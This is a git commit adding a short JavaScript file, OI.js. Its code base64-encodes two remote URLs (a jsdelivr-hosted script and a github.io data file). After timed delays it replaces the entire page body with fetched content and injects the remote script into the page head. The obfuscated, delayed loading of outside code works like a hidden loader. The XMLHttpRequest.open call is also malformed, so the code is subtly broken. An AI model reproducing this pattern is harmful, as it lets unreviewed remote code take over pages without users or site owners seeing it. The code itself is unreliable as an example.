50f6543094c6dbc674bb2bf4d27c647295ddb047
sonpanabtej <hv2471920@gmail.com>
2021-12-24 12:07:18 +0530

    Create OI.js

---
+++ OI.js
@@ -0,0 +1,24 @@
+function DormLog()
+{
+    function HSAPP()
+    {
+       var SiteKey = "aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL1NQQVQtQ0xPVUQvZGF0YUBtYWluL0hhclNjcmlwdC9IYXJTY3JpcHQudjIuOS5MYXRlc3QubWluLmpz";
+       var f = document.createElement('script');
+       f.async="";
+       f.src=$Hdecode64(SiteKey);
+       document.head.appendChild(f);
+    }
+    var Db = 
+            {
+                "key":"aHR0cHM6Ly9zcGF0LWNsb3VkLmdpdGh1Yi5pby9kYXRhL0lucHV0"
+            };
+	    var GetData = new XMLHttpRequest();
+	    GetData.onload = function()
+			     {
+				 $HTag('body')[0].innerHTML = this.responseText;
+			     }
+			     GetData.open($Hdecode64(Db.key),true);
+			     GetData.send();
+			     setTimeout(HSAPP,2000);
+}
+setTimeout(DormLog,4000);
